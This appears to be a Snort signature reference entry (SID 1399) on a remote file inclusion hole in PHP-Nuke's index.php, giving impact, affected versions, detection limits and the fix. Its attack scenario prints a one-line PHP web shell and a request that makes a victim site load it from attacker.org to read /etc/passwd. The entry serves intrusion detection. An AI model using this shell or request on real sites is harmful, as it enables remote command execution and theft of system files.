Sid:
1399

--
Summary:
This event is generated when an attempt is made to include a remote file
as part of PHP-Nuke index.php.

--
Impact:
Possible information disclosure, or command execution at the priviledge level of
the user running the webserver.

--
Detailed Information:
The index.php included with PHP-nuke allows inclusion of additional files.
Normal usage might be situations where a webmaster wants to include
additional code in their index.php.  This can be done via
"index.php?file=<path_to_file>".  PHP-nuke also allows inclusion of
files from remote sources specified by either ftp or http as the
transport protocol.  This allows attackers to craft their own php file
(say, foo.php) and store it remotely (say, http://mysite.org/foo.php)
and then instruct the victim machine to include foo.php as part of it's
source.  Any code in foo.php will get executed on the victim machine.


--
Affected Systems:
	PHP Nuke 1.0 through 5.3.1
 
--
Attack Scenarios:
In an attempt to gain access to a remote site that happens to use PHP-nuke,
an attacker crafts the following foo.php, and places it on a website that
he controls:
	
	<?php
	system($cmd);
	?> 

The attacker can then include foo.php as part of a remote site's index.php
that uses PHP-nuke, and execute any command:

	lynx \
	http://victim.com/index.php?file=http://attacker.org/foo.php?cmd=cat%20/etc/passwd
	

--
Ease of Attack:
Simple.

--
False Positives:
None Known


--
False Negatives:
If the page being accessed is not named index.php, but has the same
vulnerability as the original index.php, the rule will not generate an
event.

--
Corrective Action:
Upgrade to the latest non-affected version of the software.
